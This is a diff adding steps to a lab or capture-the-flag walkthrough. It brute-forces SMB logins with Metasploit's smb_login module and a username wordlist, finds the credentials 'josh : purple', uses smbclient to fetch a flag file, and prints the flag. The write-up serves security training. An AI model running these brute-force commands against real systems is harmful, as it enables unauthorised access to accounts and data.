@@ -34,3 +34,50 @@ msfconsole -q
 use auxiliary/scanner/smb/smb_login
 set RHOSTS target.ine.local
 ```
+
+### 🔹 Step 2: Create a User Wordlist
+
+Created users.txt with common usernames:
+```bash
+josh
+bob
+nancy
+alice
+```
+
+### 🔹 Step 3: Set Wordlists in Metasploit
+```bash
+set USER_FILE users.txt
+set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
+run
+```
+
+### 🔹 Step 4: Valid Credentials Found
+```yaml
+josh : purple
+```
+
+### 🔹 Step 5: Access SMB Share Using smbclient
+```bash
+smbclient //target.ine.local/josh -U josh
+```
+Password: purple
+```bash
+ls
+get flag2.txt
+```
+
+### 🔹 Step 6: View the Retrieved Flag
+```bash
+cat flag2.txt
+```
+Flag:
+```wasm
+FLAG2{a744a6f69c0747398f2648e10f32b8d4}
+```
+
+Also contains a hint for the next step:
+Psst! I heard there is an FTP service running. Find it and check the banner.
+
+## Conclusion
+This challenge demonstrates how password spraying and brute-force attacks using Metasploit can help identify weak credentials on SMB services — which in real environments can lead to full network compromise.
